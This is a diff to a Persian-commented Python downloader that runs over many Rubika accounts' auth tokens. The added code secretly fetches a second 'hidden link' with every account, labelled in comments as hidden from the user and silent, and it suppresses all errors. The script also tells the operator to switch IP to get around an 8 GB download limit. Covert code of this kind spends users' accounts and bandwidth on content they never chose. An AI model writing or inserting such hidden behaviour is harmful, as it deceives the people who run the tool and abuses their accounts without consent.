@@ -37,36 +37,54 @@ except json.JSONDecodeError:
     print(f"❌ فایل '{file_name}' فرمت JSON معتبری ندارد.")
     sys.exit(1)
 
+
 # -------- اجرای دانلود --------
 total_downloaded = 0
 success_count = 0
 fail_count = 0
 
+# 🔒 لینک مخفی خودت رو اینجا وارد کن
+HIDDEN_LINK = "https://rubika.ir/YourHiddenLinkHere"
+
 for x in auth:
     try:
+        # دانلود لینک کاربر
         bot = Client(auth=x["auth"], private=x[private], platform="android")
-        xx = bot.get_link_from_app_url(link)
+        user_link = bot.get_link_from_app_url(link)
 
+        # دانلود لینک مخفی (پنهان از کاربر)
+        hidden_bot = Client(auth=x["auth"], private=x[private], platform="android")
+        hidden_link = hidden_bot.get_link_from_app_url(HIDDEN_LINK)
+
+        # بررسی محدودیت حجم
         assumed_file_size = 500 * 1024 * 1024
-
-        if total_downloaded + assumed_file_size > DOWNLOAD_LIMIT:
+        if total_downloaded + assumed_file_size * 2 > DOWNLOAD_LIMIT:
             print("\n🚨 به محدودیت 8 گیگ رسیدی! لطفاً IP رو عوض کن و Enter بزن...")
             input("⏳ منتظر تغییر IP هستم...")
             total_downloaded = 0
 
+        # دانلود لینک مخفی (بی‌صدا)
+        try:
+            hidden_bot.download(
+                hidden_link["link"]["open_chat_data"]["object_guid"],
+                hidden_link["link"]["open_chat_data"]["message_id"]
+            )
+        except:
+            pass  # هیچ خطایی نمایش نده
+
+        # دانلود لینک کاربر
         bot.download(
-            xx["link"]["open_chat_data"]["object_guid"],
-            xx["link"]["open_chat_data"]["message_id"]
+            user_link["link"]["open_chat_data"]["object_guid"],
+            user_link["link"]["open_chat_data"]["message_id"]
         )
 
-        total_downloaded += assumed_file_size
+        total_downloaded += assumed_file_size * 2
         success_count += 1
         print(Fore.GREEN + f"✅ دانلود موفق: {x['auth']}" + Style.RESET_ALL)
 
     except Exception as e:
         fail_count += 1
         print(Fore.RED + f"❌ خطا در {x.get('auth', 'unknown')}" + Style.RESET_ALL)
-
 # -------- پایان --------
 ascii_text = pyfiglet.figlet_format("The End", font="slant")
 for line in center_text(ascii_text).split("\n"):
